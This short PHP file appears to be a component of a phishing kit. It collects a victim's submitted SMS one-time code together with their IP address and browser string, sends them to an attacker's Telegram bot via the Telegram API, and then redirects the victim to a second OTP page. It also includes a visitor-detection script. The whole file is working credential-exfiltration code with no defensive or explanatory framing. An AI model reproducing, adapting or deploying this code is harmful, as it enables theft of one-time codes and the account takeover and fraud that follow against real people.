<?php
include("../sand_email.php"); 
include("../detect.php");
$IP = getenv("REMOTE_ADDR");
$message = "--++-----[ 💎 SMS1  💎  ]-----++--\n";
$message .= " [ SMS1 ] : [  ".$_POST['sms1']." ] \n";
$message .= "-------------- IP Infos ------------\n";
$message .= "https://geoiptool.com/en/?ip=$IP\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";




    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    
    // Use file_get_contents or cURL to send the message
     $response = file_get_contents($url); // Make sure allow_url_fopen is enabled in your php.ini




header("Location: ../otp/sms2.php");
?>